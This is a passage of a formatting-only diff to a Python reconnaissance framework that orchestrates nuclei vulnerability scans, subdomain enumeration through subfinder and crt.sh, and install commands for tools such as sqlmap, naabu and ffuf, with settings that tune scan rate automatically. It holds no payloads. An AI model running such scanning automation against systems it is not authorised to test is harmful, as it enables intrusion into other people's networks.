15,\n+                \"max_retries\": 2,\n+                \"rate_limit\": 100,\n             },\n-            'httpx': {\n-                'threads': 50,\n-                'timeout': 15,\n-                'max_retries': 2,\n-                'rate_limit': 100\n-            },\n-            'naabu': {\n-                'rate': 1000,\n-                'timeout': 10,\n-                'retries': 2\n-            }\n+            \"naabu\": {\"rate\": 1000, \"timeout\": 10, \"retries\": 2},\n         }\n-    \n+\n     def record_result(self, result: ScanResult):\n         \"\"\"Record a scan result and update metrics\"\"\"\n         with self.lock:\n             self.results_history.append(result)\n-            \n+\n             # Update tool-specific metrics\n             tool = result.tool\n             if tool not in self.metrics_by_tool:\n                 self.metrics_by_tool[tool] = PerformanceMetrics()\n-            \n+\n             # Get recent results for this tool (last 50)\n-            recent_results = [r for r in list(self.results_history)[-50:] if r.tool == tool]\n+            recent_results = [\n+                r for r in list(self.results_history)[-50:] if r.tool == tool\n+            ]\n             if recent_results:\n                 self.metrics_by_tool[tool].update(recent_results)\n-            \n+\n             # Auto-adjust settings if performance is poor\n             self._auto_adjust_settings(tool)\n-    \n+\n     def _auto_adjust_settings(self, tool: str):\n         \"\"\"Automatically adjust tool settings based on performance\"\"\"\n         metrics = self.metrics_by_tool.get(tool)\n         if not metrics:\n             return\n-        \n+\n         settings = self.adaptive_settings.get(tool, {})\n-        \n+\n         # Adjust based on success rate\n         if metrics.success_rate < self.target_success_rate:\n             self.logger.log(f\"Low success rate for {tool}: {metrics.success_rate:.1%}\")\n-            \n-            if tool == 'nuclei':\n+\n+            if tool == \"nuclei\":\n                 # Reduce rate and concurrency for better stability\n-                current_rps = settings.get('initial_rps', 500)\n-                settings['initial_rps'] = max(settings['min_rps'], int(current_rps * 0.8))\n-                settings['concurrency'] = max(50, int(settings['concurrency'] * 0.8))\n-                settings['timeout'] = min(60, settings['timeout'] + 5)\n-                \n-            elif tool == 'httpx':\n+                current_rps = settings.get(\"initial_rps\", 500)\n+                settings[\"initial_rps\"] = max(\n+                    settings[\"min_rps\"], int(current_rps * 0.8)\n+                )\n+                settings[\"concurrency\"] = max(50, int(settings[\"concurrency\"] * 0.8))\n+                settings[\"timeout\"] = min(60, settings[\"timeout\"] + 5)\n+\n+            elif tool == \"httpx\":\n                 # Reduce threading and increase timeout\n-                settings['threads'] = max(10, int(settings['threads'] * 0.7))\n-                settings['timeout'] = min(30, settings['timeout'] + 5)\n-                settings['max_retries'] = min(5, settings['max_retries'] + 1)\n-        \n+                settings[\"threads\"] = max(10, int(settings[\"threads\"] * 0.7))\n+                settings[\"timeout\"] = min(30, settings[\"timeout\"] + 5)\n+                settings[\"max_retries\"] = min(5, settings[\"max_retries\"] + 1)\n+\n         elif metrics.success_rate > self.target_success_rate + 0.02:\n             # Performance is good, we can be more aggressive\n-            if tool == 'nuclei':\n-                current_rps = settings.get('initial_rps', 500)\n-                settings['initial_rps'] = min(settings['max_rps'], int(current_rps * 1.1))\n-                settings['concurrency'] = min(200, int(settings['concurrency'] * 1.1))\n-            \n-            elif tool == 'httpx':\n-                settings['threads'] = min(100, int(settings['threads'] * 1.2))\n-    \n+            if tool == \"nuclei\":\n+                current_rps = settings.get(\"initial_rps\", 500)\n+                settings[\"initial_rps\"] = min(\n+                    settings[\"max_rps\"], int(current_rps * 1.1)\n+                )\n+                settings[\"concurrency\"] = min(200, int(settings[\"concurrency\"] * 1.1))\n+\n+            elif tool == \"httpx\":\n+                settings[\"threads\"] = min(100, int(settings[\"threads\"] * 1.2))\n+\n     def get_optimized_settings(self, tool: str) -> Dict[str, Any]:\n         \"\"\"Get optimized settings for a specific tool\"\"\"\n         return self.adaptive_settings.get(tool, {}).copy()\n-    \n+\n     def get_current_success_rate(self) -> float:\n         \"\"\"Get current overall success rate\"\"\"\n         if not self.results_history:\n             return 0.0\n-        \n+\n         recent_results = list(self.results_history)[-100:]  # Last 100 results\n         if not recent_results:\n             return 0.0\n-        \n+\n         successful = sum(1 for r in recent_results if r.success)\n         return successful / len(recent_results)\n-    \n+\n     def get_tool_performance(self, tool: str) -> Optional[PerformanceMetrics]:\n         \"\"\"Get performance metrics for a specific tool\"\"\"\n         return self.metrics_by_tool.get(tool)\n-    \n+\n     def should_skip_tool(self, tool: str) -> bool:\n         \"\"\"Determine if a tool should be skipped due to poor performance\"\"\"\n         metrics = self.metrics_by_tool.get(tool)\n         if not metrics:\n             return False\n-        \n+\n         # Skip if success rate is extremely low and we have enough data\n         recent_results = [r for r in list(self.results_history)[-20:] if r.tool == tool]\n         if len(recent_results) >= 10 and metrics.success_rate < 0.1:\n-            self.logger.log(f\"Skipping {tool} due to low success rate: {metrics.success_rate:.1%}\")\n+            self.logger.log(\n+                f\"Skipping {tool} due to low success rate: {metrics.success_rate:.1%}\"\n+            )\n             return True\n-        \n+\n         return False\n-    \n+\n     def export_metrics(self, file_path: str):\n         \"\"\"Export performance metrics to JSON file\"\"\"\n         metrics_data = {\n-            'overall_success_rate': self.get_current_success_rate(),\n-            'target_success_rate': self.target_success_rate,\n-            'total_scans': len(self.results_history),\n-            'tools': {}\n+            \"overall_success_rate\": self.get_current_success_rate(),\n+            \"target_success_rate\": self.target_success_rate,\n+            \"total_scans\": len(self.results_history),\n+            \"tools\": {},\n         }\n-        \n+\n         for tool, metrics in self.metrics_by_tool.items():\n-            metrics_data['tools'][tool] = {\n-                'success_rate': metrics.success_rate,\n-                'average_duration': metrics.average_duration,\n-                'throughput': metrics.throughput,\n-                'error_rate': metrics.error_rate,\n-                'last_updated': metrics.last_updated.isoformat(),\n-                'optimized_settings': self.adaptive_settings.get(tool, {})\n+            metrics_data[\"tools\"][tool] = {\n+                \"success_rate\": metrics.success_rate,\n+                \"average_duration\": metrics.average_duration,\n+                \"throughput\": metrics.throughput,\n+                \"error_rate\": metrics.error_rate,\n+                \"last_updated\": metrics.last_updated.isoformat(),\n+                \"optimized_settings\": self.adaptive_settings.get(tool, {}),\n             }\n-        \n+\n         atomic_write(file_path, json.dumps(metrics_data, indent=2))\n+\n \n class EnhancedScanner:\n     \"\"\"Enhanced scanner with improved reliability and success tracking\"\"\"\n-    \n+\n     def __init__(self, scan_manager: AdaptiveScanManager):\n         self.scan_manager = scan_manager\n         self.logger = PantheonLogger(\"EnhancedScanner\")\n-        \n-    def enhanced_nuclei_scan(self, targets: List[str], output_dir: Path) -> Tuple[bool, int]:\n+\n+    def enhanced_nuclei_scan(\n+        self, targets: List[str], output_dir: Path\n+    ) -> Tuple[bool, int]:\n         \"\"\"Enhanced nuclei scan with adaptive settings and fallback\"\"\"\n         # Check tool availability using enhanced tool manager\n         tool_available = False\n         if ENHANCED_TOOL_MANAGER_AVAILABLE:\n-            nuclei_path = enhanced_which('nuclei')\n-            tool_available = nuclei_path is not None and not nuclei_path.startswith('virtual:')\n+            nuclei_path = enhanced_which(\"nuclei\")\n+            tool_available = nuclei_path is not None and not nuclei_path.startswith(\n+                \"virtual:\"\n+            )\n         else:\n-            tool_available = which('nuclei')\n-        \n+            tool_available = which(\"nuclei\")\n+\n         # Try nuclei first if available, otherwise use fallback\n         if tool_available:\n             return self._nuclei_scan_with_tool(targets, output_dir)\n         else:\n             # Use fallback scanner\n             self.logger.log(\"Nuclei not available, using fallback scanner\", \"INFO\")\n             return self._fallback_scan(targets, output_dir)\n-    \n-    def _nuclei_scan_with_tool(self, targets: List[str], output_dir: Path) -> Tuple[bool, int]:\n+\n+    def _nuclei_scan_with_tool(\n+        self, targets: List[str], output_dir: Path\n+    ) -> Tuple[bool, int]:\n         \"\"\"Original nuclei scan with external tool\"\"\"\n-        if self.scan_manager.should_skip_tool('nuclei'):\n+        if self.scan_manager.should_skip_tool(\"nuclei\"):\n             return False, 0\n-        \n-        settings = self.scan_manager.get_optimized_settings('nuclei')\n+\n+        settings = self.scan_manager.get_optimized_settings(\"nuclei\")\n         findings_count = 0\n         success_count = 0\n-        \n+\n         for target in targets:\n             if not (validate_domain_input(target) or validate_ip_input(target)):\n                 continue\n-            \n+\n             start_time = time.time()\n-            \n+\n             try:\n                 # Rate limiting\n                 if not rate_limiter.is_allowed(f\"nuclei_{target}\"):\n                     wait_time = rate_limiter.wait_time(f\"nuclei_{target}\")\n                     if wait_time > 0:\n                         time.sleep(min(wait_time, 5))\n-                \n+\n                 output_file = output_dir / f\"nuclei_{target.replace(':', '_')}.json\"\n-                \n+\n                 cmd = [\n-                    'nuclei',\n-                    '-target', target,\n-                    '-json',\n-                    '-o', str(output_file),\n-                    '-rate-limit', str(settings.get('initial_rps', 500)),\n-                    '-concurrency', str(settings.get('concurrency', 150)),\n-                    '-timeout', str(settings.get('timeout', 30))\n+                    \"nuclei\",\n+                    \"-target\",\n+                    target,\n+                    \"-json\",\n+                    \"-o\",\n+                    str(output_file),\n+                    \"-rate-limit\",\n+                    str(settings.get(\"initial_rps\", 500)),\n+                    \"-concurrency\",\n+                    str(settings.get(\"concurrency\", 150)),\n+                    \"-timeout\",\n+                    str(settings.get(\"timeout\", 30)),\n                 ]\n-                \n+\n                 result_code, stdout, stderr = safe_run_command(cmd, timeout=300)\n                 end_time = time.time()\n-                \n+\n                 # Count findings\n                 target_findings = 0\n                 if output_file.exists():\n                     try:\n-                        with open(output_file, 'r') as f:\n+                        with open(output_file, \"r\") as f:\n                             content = f.read().strip()\n                             if content:\n-                                target_findings = len([line for line in content.split('\\n') if line.strip()])\n+                                target_findings = len(\n+                                    [\n+                                        line\n+                                        for line in content.split(\"\\n\")\n+                                        if line.strip()\n+                                    ]\n+                                )\n                         findings_count += target_findings\n                     except Exception as e:\n                         self.logger.log(f\"Error reading nuclei output: {e}\", \"WARNING\")\n-                \n+\n                 # Record result\n                 scan_result = ScanResult(\n                     target=target,\n-                    tool='nuclei',\n+                    tool=\"nuclei\",\n                     start_time=start_time,\n                     end_time=end_time,\n                     success=(result_code == 0),\n                     output_size=len(stdout) if stdout else 0,\n                     error_message=stderr if result_code != 0 else None,\n-                    findings_count=target_findings\n+                    findings_count=target_findings,\n                 )\n-                \n+\n                 self.scan_manager.record_result(scan_result)\n-                \n+\n                 if result_code == 0:\n                     success_count += 1\n-                \n+\n             except Exception as e:\n                 end_time = time.time()\n                 self.logger.log(f\"Nuclei scan failed for {target}: {e}\", \"ERROR\")\n-                \n+\n                 # Record failure\n                 scan_result = ScanResult(\n                     target=target,\n-                    tool='nuclei',\n+                    tool=\"nuclei\",\n                     start_time=start_time,\n                     end_time=end_time,\n                     success=False,\n-                    error_message=str(e)\n+                    error_message=str(e),\n                 )\n                 self.scan_manager.record_result(scan_result)\n-        \n+\n         success_rate = success_count / len(targets) if targets else 0\n-        self.logger.log(f\"Nuclei scan completed: {success_count}/{len(targets)} targets successful ({success_rate:.1%})\")\n-        \n+        self.logger.log(\n+            f\"Nuclei scan completed: {success_count}/{len(targets)} targets successful ({success_rate:.1%})\"\n+        )\n+\n         return success_rate >= 0.8, findings_count\n-    \n+\n     def _fallback_scan(self, targets: List[str], output_dir: Path) -> Tuple[bool, int]:\n         \"\"\"Fallback scan using built-in capabilities\"\"\"\n         try:\n             # Import fallback scanner\n             from fallback_scanner import run_fallback_scan\n-            \n+\n             # Run fallback scan\n             success, findings_count = run_fallback_scan(targets, output_dir)\n-            \n+\n             # Record results for each target\n             for target in targets:\n                 scan_result = ScanResult(\n                     target=target,\n-                    tool='fallback_scanner',\n+                    tool=\"fallback_scanner\",\n                     start_time=time.time(),\n                     end_time=time.time(),\n                     success=success,\n-                    findings_count=findings_count // len(targets) if targets else 0  # Approximate\n+                    findings_count=(\n+                        findings_count // len(targets) if targets else 0\n+                    ),  # Approximate\n                 )\n                 self.scan_manager.record_result(scan_result)\n-            \n-            self.logger.log(f\"Fallback scan completed: {findings_count} findings from {len(targets)} targets\")\n+\n+            self.logger.log(\n+                f\"Fallback scan completed: {findings_count} findings from {len(targets)} targets\"\n+            )\n             return success, findings_count\n-            \n+\n         except ImportError:\n             self.logger.log(\"Fallback scanner not available\", \"ERROR\")\n             return False, 0\n         except Exception as e:\n             self.logger.log(f\"Fallback scan failed: {e}\", \"ERROR\")\n             return False, 0\n-    \n-    def enhanced_subdomain_enum(self, domain: str, output_dir: Path) -> Tuple[bool, List[str]]:\n+\n+    def enhanced_subdomain_enum(\n+        self, domain: str, output_dir: Path\n+    ) -> Tuple[bool, List[str]]:\n         \"\"\"Enhanced subdomain enumeration with multiple tools and fallbacks\"\"\"\n         if not validate_domain_input(domain):\n             return False, []\n-        \n+\n         all_subdomains = set()\n         tools_used = []\n         success_count = 0\n-        \n+\n         # Try subfinder first\n-        if which('subfinder') and not self.scan_manager.should_skip_tool('subfinder'):\n+        if which(\"subfinder\") and not self.scan_manager.should_skip_tool(\"subfinder\"):\n             start_time = time.time()\n             try:\n                 output_file = output_dir / f\"subfinder_{domain}.txt\"\n-                cmd = ['subfinder', '-domain', domain, '-o', str(output_file), '-silent']\n-                \n+                cmd = [\n+                    \"subfinder\",\n+                    \"-domain\",\n+                    domain,\n+                    \"-o\",\n+                    str(output_file),\n+                    \"-silent\",\n+                ]\n+\n                 result_code, stdout, stderr = safe_run_command(cmd, timeout=120)\n                 end_time = time.time()\n-                \n+\n                 subdomains = []\n                 if output_file.exists():\n                     subdomains = read_lines(str(output_file))\n                     all_subdomains.update(subdomains)\n-                \n+\n                 scan_result = ScanResult(\n                     target=domain,\n-                    tool='subfinder',\n+                    tool=\"subfinder\",\n                     start_time=start_time,\n                     end_time=end_time,\n                     success=(result_code == 0),\n-                    findings_count=len(subdomains)\n+                    findings_count=len(subdomains),\n                 )\n                 self.scan_manager.record_result(scan_result)\n-                \n+\n                 if result_code == 0:\n                     success_count += 1\n-                    tools_used.append('subfinder')\n-                \n+                    tools_used.append(\"subfinder\")\n+\n             except Exception as e:\n                 end_time = time.time()\n                 scan_result = ScanResult(\n                     target=domain,\n-                    tool='subfinder',\n+                    tool=\"subfinder\",\n                     start_time=start_time,\n                     end_time=end_time,\n                     success=False,\n-                    error_message=str(e)\n+                    error_message=str(e),\n                 )\n                 self.scan_manager.record_result(scan_result)\n-        \n+\n         # Try certificate transparency as fallback\n         if len(all_subdomains) < 5:  # If we didn't get many results\n             try:\n                 ct_subdomains = self._certificate_transparency_search(domain)\n                 all_subdomains.update(ct_subdomains)\n                 if ct_subdomains:\n-                    tools_used.append('certificate_transparency')\n+                    tools_used.append(\"certificate_transparency\")\n                     success_count += 1\n             except Exception as e:\n                 self.logger.log(f\"CT search failed: {e}\", \"WARNING\")\n-        \n+\n         # Write combined results\n         if all_subdomains:\n             combined_file = output_dir / f\"subdomains_{domain}.txt\"\n-            atomic_write(str(combined_file), '\\n'.join(sorted(all_subdomains)))\n-        \n+            atomic_write(str(combined_file), \"\\n\".join(sorted(all_subdomains)))\n+\n         success_rate = success_count / max(1, len(tools_used)) if tools_used else 0\n-        self.logger.log(f\"Subdomain enumeration for {domain}: {len(all_subdomains)} found using {tools_used}\")\n-        \n+        self.logger.log(\n+            f\"Subdomain enumeration for {domain}: {len(all_subdomains)} found using {tools_used}\"\n+        )\n+\n         return success_rate >= 0.5, list(all_subdomains)\n-    \n+\n     def _certificate_transparency_search(self, domain: str) -> List[str]:\n         \"\"\"Search certificate transparency logs for subdomains\"\"\"\n         import requests\n-        \n+\n         try:\n             url = f\"https://crt.sh/?q=%.{domain}&output=json\"\n             response = requests.get(url, timeout=30)\n-            \n+\n             if response.status_code == 200:\n                 data = response.json()\n                 subdomains = set()\n-                \n+\n                 for entry in data:\n-                    name_value = entry.get('name_value', '')\n-                    for name in name_value.split('\\n'):\n+                    name_value = entry.get(\"name_value\", \"\")\n+                    for name in name_value.split(\"\\n\"):\n                         name = name.strip()\n-                        if name and '.' in name and name.endswith(domain):\n+                        if name and \".\" in name and name.endswith(domain):\n                             subdomains.add(name)\n-                \n+\n                 return list(subdomains)\n-        \n+\n         except Exception as e:\n             self.logger.log(f\"Certificate transparency search failed: {e}\", \"WARNING\")\n-        \n+\n         return []\n+\n \n # Global instance for easy import\n adaptive_scan_manager = AdaptiveScanManager()\n enhanced_scanner = EnhancedScanner(adaptive_scan_manager)\n \n+\n def get_current_success_rate() -> float:\n     \"\"\"Get current overall success rate\"\"\"\n     return adaptive_scan_manager.get_current_success_rate()\n \n+\n def get_performance_report() -> Dict[str, Any]:\n     \"\"\"Get comprehensive performance report\"\"\"\n     return {\n-        'overall_success_rate': adaptive_scan_manager.get_current_success_rate(),\n-        'target_success_rate': adaptive_scan_manager.target_success_rate,\n-        'total_scans': len(adaptive_scan_manager.results_history),\n-        'tools_performance': {\n+        \"overall_success_rate\": adaptive_scan_manager.get_current_success_rate(),\n+        \"target_success_rate\": adaptive_scan_manager.target_success_rate,\n+        \"total_scans\": len(adaptive_scan_manager.results_history),\n+        \"tools_performance\": {\n             tool: {\n-                'success_rate': metrics.success_rate,\n-                'average_duration': metrics.average_duration,\n-                'throughput': metrics.throughput\n+                \"success_rate\": metrics.success_rate,\n+                \"average_duration\": metrics.average_duration,\n+                \"throughput\": metrics.throughput,\n             }\n             for tool, metrics in adaptive_scan_manager.metrics_by_tool.items()\n-        }\n+        },\n     }\n \n-def run_enhanced_scanning(targets: List[str], config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:\n+\n+def run_enhanced_scanning(\n+    targets: List[str], config: Optional[Dict[str, Any]] = None\n+) -> Dict[str, Any]:\n     \"\"\"\n     Run enhanced scanning with adaptive management\n-    \n+\n     Args:\n         targets: List of targets to scan\n         config: Optional configuration dictionary\n-        \n+\n     Returns:\n         Dictionary with scan results and performance metrics\n     \"\"\"\n     from pathlib import Path\n     import tempfile\n-    \n+\n     # Use temporary directory for output if not specified\n     output_dir = Path(tempfile.mkdtemp(prefix=\"enhanced_scan_\"))\n-    \n+\n     # Initialize scanner with config\n     if config:\n         scan_manager = AdaptiveScanManager(config)\n     else:\n         scan_manager = adaptive_scan_manager\n-    \n+\n     scanner = EnhancedScanner(scan_manager)\n-    \n+\n     results = {\n-        'targets_processed': len(targets),\n-        'successful_scans': 0,\n-        'failed_scans': 0,\n-        'findings': [],\n-        'performance_metrics': {},\n-        'output_directory': str(output_dir)\n+        \"targets_processed\": len(targets),\n+        \"successful_scans\": 0,\n+        \"failed_scans\": 0,\n+        \"findings\": [],\n+        \"performance_metrics\": {},\n+        \"output_directory\": str(output_dir),\n     }\n-    \n+\n     try:\n         # Run nuclei scan if targets provided\n         if targets:\n             success, findings_count = scanner.enhanced_nuclei_scan(targets, output_dir)\n             if success:\n-                results['successful_scans'] += 1\n-                results['findings'].append({\n-                    'tool': 'nuclei',\n-                    'findings_count': findings_count,\n-                    'success': True\n-                })\n+                results[\"successful_scans\"] += 1\n+                results[\"findings\"].append(\n+                    {\n+                        \"tool\": \"nuclei\",\n+                        \"findings_count\": findings_count,\n+                        \"success\": True,\n+                    }\n+                )\n             else:\n-                results['failed_scans'] += 1\n-        \n+                results[\"failed_scans\"] += 1\n+\n         # Get performance metrics\n-        results['performance_metrics'] = get_performance_report()\n-        \n+        results[\"performance_metrics\"] = get_performance_report()\n+\n         return results\n-        \n+\n     except Exception as e:\n-        results['error'] = str(e)\n-        results['failed_scans'] = len(targets)\n+        results[\"error\"] = str(e)\n+        results[\"failed_scans\"] = len(targets)\n         return results\n+\n \n if __name__ == \"__main__\":\n     # Quick test\n     print(\"Enhanced Scanning Module - Test\")\n     print(f\"Current success rate: {get_current_success_rate():.1%}\")\n     print(\"Available functions:\")\n     print(\"- AdaptiveScanManager: Adaptive scanning with performance optimization\")\n     print(\"- EnhancedScanner: Enhanced scanning with reliability improvements\")\n     print(\"- get_current_success_rate(): Get current success rate\")\n-    print(\"- get_performance_report(): Get performance metrics\")\n\\ No newline at end of file\n+    print(\"- get_performance_report(): Get performance metrics\")\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_tool_manager.py\t2025-09-14 19:10:58.550754+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_tool_manager.py\t2025-09-14 19:23:11.107550+00:00\n@@ -15,415 +15,476 @@\n from dataclasses import dataclass, field\n from datetime import datetime\n import threading\n import tempfile\n \n+\n # Tool configuration\n @dataclass\n class ToolConfig:\n     \"\"\"Configuration for a security tool\"\"\"\n+\n     name: str\n     install_method: str  # 'go', 'apt', 'pip', 'manual', 'github'\n     source_url: str = \"\"\n     alternatives: List[str] = field(default_factory=list)\n     required: bool = True\n     fallback_available: bool = False\n     min_version: str = \"\"\n     install_cmd: List[str] = field(default_factory=list)\n     verify_cmd: List[str] = field(default_factory=list)\n \n+\n class ToolManager:\n     \"\"\"Enhanced tool management with automatic installation and fallbacks\"\"\"\n-    \n+\n     def __init__(self):\n         self.tools = self._initialize_tool_configs()\n         self.tool_status: Dict[str, Dict] = {}\n         self.last_check_time: Dict[str, float] = {}\n         self.lock = threading.Lock()\n         self._update_tool_status()\n-    \n+\n     def _initialize_tool_configs(self) -> Dict[str, ToolConfig]:\n         \"\"\"Initialize configurations for all tools\"\"\"\n         return {\n-            'nuclei': ToolConfig(\n-                name='nuclei',\n-                install_method='go',\n-                source_url='github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest',\n-                alternatives=['nuclei-scanner'],\n+            \"nuclei\": ToolConfig(\n+                name=\"nuclei\",\n+                install_method=\"go\",\n+                source_url=\"github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest\",\n+                alternatives=[\"nuclei-scanner\"],\n                 required=True,\n                 fallback_available=False,\n-                install_cmd=['go', 'install', '-v', 'github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest'],\n-                verify_cmd=['nuclei', '-version']\n-            ),\n-            'subfinder': ToolConfig(\n-                name='subfinder',\n-                install_method='go',\n-                source_url='github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest',\n-                alternatives=['amass', 'assetfinder'],\n+                install_cmd=[\n+                    \"go\",\n+                    \"install\",\n+                    \"-v\",\n+                    \"github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest\",\n+                ],\n+                verify_cmd=[\"nuclei\", \"-version\"],\n+            ),\n+            \"subfinder\": ToolConfig(\n+                name=\"subfinder\",\n+                install_method=\"go\",\n+                source_url=\"github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest\",\n+                alternatives=[\"amass\", \"assetfinder\"],\n                 required=True,\n                 fallback_available=True,\n-                install_cmd=['go', 'install', '-v', 'github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest'],\n-                verify_cmd=['subfinder', '-version']\n-            ),\n-            'httpx': ToolConfig(\n-                name='httpx',\n-                install_method='go',\n-                source_url='github.com/projectdiscovery/httpx/cmd/httpx@latest',\n-                alternatives=['httpx-toolkit'],\n+                install_cmd=[\n+                    \"go\",\n+                    \"install\",\n+                    \"-v\",\n+                    \"github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest\",\n+                ],\n+                verify_cmd=[\"subfinder\", \"-version\"],\n+            ),\n+            \"httpx\": ToolConfig(\n+                name=\"httpx\",\n+                install_method=\"go\",\n+                source_url=\"github.com/projectdiscovery/httpx/cmd/httpx@latest\",\n+                alternatives=[\"httpx-toolkit\"],\n                 required=True,\n                 fallback_available=True,\n-                install_cmd=['go', 'install', '-v', 'github.com/projectdiscovery/httpx/cmd/httpx@latest'],\n-                verify_cmd=['httpx', '-version']\n-            ),\n-            'naabu': ToolConfig(\n-                name='naabu',\n-                install_method='go',\n-                source_url='github.com/projectdiscovery/naabu/v2/cmd/naabu@latest',\n-                alternatives=['nmap', 'masscan'],\n+                install_cmd=[\n+                    \"go\",\n+                    \"install\",\n+                    \"-v\",\n+                    \"github.com/projectdiscovery/httpx/cmd/httpx@latest\",\n+                ],\n+                verify_cmd=[\"httpx\", \"-version\"],\n+            ),\n+            \"naabu\": ToolConfig(\n+                name=\"naabu\",\n+                install_method=\"go\",\n+                source_url=\"github.com/projectdiscovery/naabu/v2/cmd/naabu@latest\",\n+                alternatives=[\"nmap\", \"masscan\"],\n                 required=True,\n                 fallback_available=True,\n-                install_cmd=['go', 'install', '-v', 'github.com/projectdiscovery/naabu/v2/cmd/naabu@latest'],\n-                verify_cmd=['naabu', '-version']\n-            ),\n-            'katana': ToolConfig(\n-                name='katana',\n-                install_method='go',\n-                source_url='github.com/projectdiscovery/katana/cmd/katana@latest',\n-                alternatives=['gau', 'waybackurls'],\n+                install_cmd=[\n+                    \"go\",\n+                    \"install\",\n+                    \"-v\",\n+                    \"github.com/projectdiscovery/naabu/v2/cmd/naabu@latest\",\n+                ],\n+                verify_cmd=[\"naabu\", \"-version\"],\n+            ),\n+            \"katana\": ToolConfig(\n+                name=\"katana\",\n+                install_method=\"go\",\n+                source_url=\"github.com/projectdiscovery/katana/cmd/katana@latest\",\n+                alternatives=[\"gau\", \"waybackurls\"],\n                 required=False,\n                 fallback_available=True,\n-                install_cmd=['go', 'install', '-v', 'github.com/projectdiscovery/katana/cmd/katana@latest'],\n-                verify_cmd=['katana', '-version']\n-            ),\n-            'gau': ToolConfig(\n-                name='gau',\n-                install_method='go',\n-                source_url='github.com/lc/gau/v2/cmd/gau@latest',\n-                alternatives=['katana', 'waybackurls'],\n+                install_cmd=[\n+                    \"go\",\n+                    \"install\",\n+                    \"-v\",\n+                    \"github.com/projectdiscovery/katana/cmd/katana@latest\",\n+                ],\n+                verify_cmd=[\"katana\", \"-version\"],\n+            ),\n+            \"gau\": ToolConfig(\n+                name=\"gau\",\n+                install_method=\"go\",\n+                source_url=\"github.com/lc/gau/v2/cmd/gau@latest\",\n+                alternatives=[\"katana\", \"waybackurls\"],\n                 required=False,\n                 fallback_available=True,\n-                install_cmd=['go', 'install', '-v', 'github.com/lc/gau/v2/cmd/gau@latest'],\n-                verify_cmd=['gau', '--version']\n-            ),\n-            'ffuf': ToolConfig(\n-                name='ffuf',\n-                install_method='go',\n-                source_url='github.com/ffuf/ffuf/v2@latest',\n-                alternatives=['gobuster', 'dirb'],\n+                install_cmd=[\n+                    \"go\",\n+                    \"install\",\n+                    \"-v\",\n+                    \"github.com/lc/gau/v2/cmd/gau@latest\",\n+                ],\n+                verify_cmd=[\"gau\", \"--version\"],\n+            ),\n+            \"ffuf\": ToolConfig(\n+                name=\"ffuf\",\n+                install_method=\"go\",\n+                source_url=\"github.com/ffuf/ffuf/v2@latest\",\n+                alternatives=[\"gobuster\", \"dirb\"],\n                 required=False,\n                 fallback_available=True,\n-                install_cmd=['go', 'install', '-v', 'github.com/ffuf/ffuf/v2@latest'],\n-                verify_cmd=['ffuf', '-V']\n-            ),\n-            'sqlmap': ToolConfig(\n-                name='sqlmap',\n-                install_method='apt',\n+                install_cmd=[\"go\", \"install\", \"-v\", \"github.com/ffuf/ffuf/v2@latest\"],\n+                verify_cmd=[\"ffuf\", \"-V\"],\n+            ),\n+            \"sqlmap\": ToolConfig(\n+                name=\"sqlmap\",\n+                install_method=\"apt\",\n                 alternatives=[],\n                 required=False,\n                 fallback_available=False,\n-                install_cmd=['apt-get', 'install', '-y', 'sqlmap'],\n-                verify_cmd=['sqlmap', '--version']\n-            ),\n-            'nmap': ToolConfig(\n-                name='nmap',\n-                install_method='apt',\n-                alternatives=['naabu'],\n+                install_cmd=[\"apt-get\", \"install\", \"-y\", \"sqlmap\"],\n+                verify_cmd=[\"sqlmap\", \"--version\"],\n+            ),\n+            \"nmap\": ToolConfig(\n+                name=\"nmap\",\n+                install_method=\"apt\",\n+                alternatives=[\"naabu\"],\n                 required=False,\n                 fallback_available=True,\n-                install_cmd=['apt-get', 'install', '-y', 'nmap'],\n-                verify_cmd=['nmap', '--version']\n-            )\n+                install_cmd=[\"apt-get\", \"install\", \"-y\", \"nmap\"],\n+                verify_cmd=[\"nmap\", \"--version\"],\n+            ),\n         }\n-    \n+\n     def which(self, tool_name: str) -> Optional[str]:\n         \"\"\"Enhanced which function with caching and alternative checking\"\"\"\n         with self.lock:\n             # Check cache first (cache for 30 seconds)\n             current_time = time.time()\n-            if (tool_name in self.last_check_time and \n-                current_time - self.last_check_time[tool_name] < 30):\n-                \n+            if (\n+                tool_name in self.last_check_time\n+                and current_time - self.last_check_time[tool_name] < 30\n+            ):\n+\n                 status = self.tool_status.get(tool_name, {})\n-                if status.get('available'):\n-                    return status.get('path')\n+                if status.get(\"available\"):\n+                    return status.get(\"path\")\n                 return None\n-            \n+\n             # Update cache\n             self.last_check_time[tool_name] = current_time\n-            \n+\n             # Check primary tool\n             tool_path = shutil.which(tool_name)\n             if tool_path:\n                 self.tool_status[tool_name] = {\n-                    'available': True,\n-                    'path': tool_path,\n-                    'checked_at': current_time\n+                    \"available\": True,\n+                    \"path\": tool_path,\n+                    \"checked_at\": current_time,\n                 }\n                 return tool_path\n-            \n+\n             # Check for virtual/fallback implementations\n             virtual_tools = {\n-                'nuclei': 'fallback_scanner',\n-                'subfinder': 'builtin_subdomain_enum',\n-                'httpx': 'builtin_http_probe',\n-                'naabu': 'builtin_port_scan',\n-                'katana': 'builtin_crawler',\n-                'gau': 'builtin_url_discovery',\n-                'ffuf': 'builtin_directory_fuzz',\n-                'sqlmap': 'builtin_sql_test',\n-                'amass': 'builtin_subdomain_enum'\n+                \"nuclei\": \"fallback_scanner\",\n+                \"subfinder\": \"builtin_subdomain_enum\",\n+                \"httpx\": \"builtin_http_probe\",\n+                \"naabu\": \"builtin_port_scan\",\n+                \"katana\": \"builtin_crawler\",\n+                \"gau\": \"builtin_url_discovery\",\n+                \"ffuf\": \"builtin_directory_fuzz\",\n+                \"sqlmap\": \"builtin_sql_test\",\n+                \"amass\": \"builtin_subdomain_enum\",\n             }\n-            \n+\n             if tool_name in virtual_tools:\n                 self.tool_status[tool_name] = {\n-                    'available': True,\n-                    'path': 